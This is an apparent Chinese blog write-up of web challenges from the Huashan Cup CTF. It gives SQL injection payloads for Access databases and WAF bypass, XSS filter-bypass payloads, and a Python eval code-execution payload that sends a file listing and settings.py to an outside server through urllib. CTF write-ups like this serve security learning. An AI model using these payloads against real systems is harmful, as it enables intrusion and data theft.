title: SPWC & 华山杯？ writeup
date: 2015-11-02 14:36:19
tags:
- Blogs
- ctf
categories:
- Blogs
---
最近没什么时间好好去打个ctf，这段时间抽空找了两个ctf比赛做了做web题目，也算是长了很多见识，这里还是留存下觉得有用的东西。

<!--more-->

# 华山杯 #

华山杯比赛的整体水平还挺不错，而且除了第二道脑洞以外脑洞都不打，学到了很多姿势

## web1 怎么在web上ping呢？ （html ping ddos) ##
最开始做这道题目的时候一直以为是php上面的黑魔法，研究了半天也没得到答案，后来看writeup的时候，发现了其实是html上的属性，[HTML PING](http://netsecurity.51cto.com/art/201508/487806.htm)

在前台中直接修改元素为
```
<a href="flag.php" ping="flag.php">
```
然后点击就会产生异步的post包，抓包就能看到flag了，由于这个属性及易造成ddos，所以firefox默认ban掉了这个属性，所以这里需要使用别的浏览器。

## web2 社工库查询 （intval 取整）##

题目真的有点儿脑洞大，首先翻翻发现存在一个robots.txt页面，里面提示到题目不是注入或者xss，也不需要扫目录，于是开始以为是从西瓜大神入手，社工了很久都没有想法，看到writeup才知道，提示里面的系统消息是指qq的10000号，在社工库中搜索10000就可以看到提示。
![](/img/hsb/1.png)

这里看到是intval，所以输入10000.1得到flag

## web3 access偏移注入
这题让我学到很多东西，首先是去搜了下access注入；
注入的步骤首先是判断是否存在注入点：
```
and 1=1
and 1=2
```
然后是判断表名字
```
 and exists (select * from 表名)
```
这里判断到是admin表
然后是判断是否存在字段
```
and exists (select 字段 from 表名）
```
我觉得正常能手跑出来的只有id，但是如果用sqlmap跑，还会有一些奇怪的，比如fname和realname（事实证明并没有什么用）
然后是判断字段数目
```
order by X(x为数字）
```
我这里判断结果为12.
接下来是union联合查询
```
http://218.245.4.113:8888/web03/ca55022fa7ae5c29d179041883fe1556/index.asp
?id=886 union select 1,2,3,4,5,6,7,8,9,10,11,12 from admin
```
这里回显是这样的
**5 Origin:7**
证明回显为是上面的5和7，但是跑了半天发现，无论注出什么数据，都和flag无关。

后面查到如果找不到需要的字段，可以使用access偏移注入，
给我启发的是这篇文章
[http://www.2cto.com/Article/201103/85452.html](http://www.2cto.com/Article/201103/85452.html)

最后的payload如下
```
http://218.245.4.113:8888/web03/ca55022fa7ae5c29d179041883fe1556/index.asp
?id=886 union select 1,2,3,4,* from (admin as a inner join admin as b on a.id=b.id)
```
得到密码hash，即是flag

## web4 有ｗａｆ该怎么注入呢　（sqli）
这里的题目没有认真做过，所以这里还是暂时贴上来几个payload:
```
id=1%20%26%26%20ord(substr((select%60flag%60from%60flag%60),1,1))=107
```
```
id=(select%a0ord(mid(flag,{},1))={}%a0from%a0flag)
```
写个python脚本泡泡就能得到答案了

## web5 xss?xss? (xss/oncut=outerhtml) ##
做题时候照例尝试了过滤，大概试了试发现
```
# $ '' * + 1 - . / ; : < > @ [ ] \      //大部分符号被过滤，但是这里&和%没过滤，于是编码可以绕过

```
还发现on被过滤，开始发现<>和on我直接懵了，后来发现只要大写就可以绕过，于是，这里用了一个很特殊的黑科技，[原文是这样的](http://drops.wooyun.org/papers/938)，这里直接用了一个简单的payload

```
YWxlcnQoMSkK"Oncut/setInterval%atob(value)),&quot   //前面的base64是alert(1)
```
这里用setinterval定时执行了value base64编码的值
还有一种是执行location.hash里，节省了长度
```
"Oncut=outerHTML=URL,%26quot#<iframe/onload=alert(1)></iframe>
```

## web6 python web ##

python 不精，还是贴上别人的writeup
![](/img/hsb/2.png)

登陆的时候看到报错

看到这个就想起了，任意代码执行，obj和method我们都可以控制
getattr(globals()[c[‘obj’]],c['method'])
然后在params这输入任意字符报错：	
ret = method(c[‘params'])
这三个我们都可以控制，那就是代码执行了，但是我们需要找到一个对象调用里面的方法，而python内置有一个__builtin__可以调用，这样我们调用eval方法就可以执行任意代码了
但是因为沙盒不能执行命令等危险操作。。。。。要得到数据可以通过urllib传到我们的服务器上
payload：
**{“obj":"__builtin__","method":"eval","params":"__import__('urllib').urlopen('http://128.199.225.225:8080'+__import__('os').getcwd())"}**
看到请求了:

![](/img/hsb/3.png)


沙盒不能用os.popen,os.system执行命令，那就先用os,listdir(‘./‘)列目录

![](/img/hsb/4.png)

最后用读取到settings.py里面的flag
payload:
**{"obj":"__builtin__","method":"eval","params":"__import__('urllib').urlopen('http://198.199.105.146:8080',open('./mysite/settings.py').read())"}**

![](/img/hsb/5.png)


# spwc #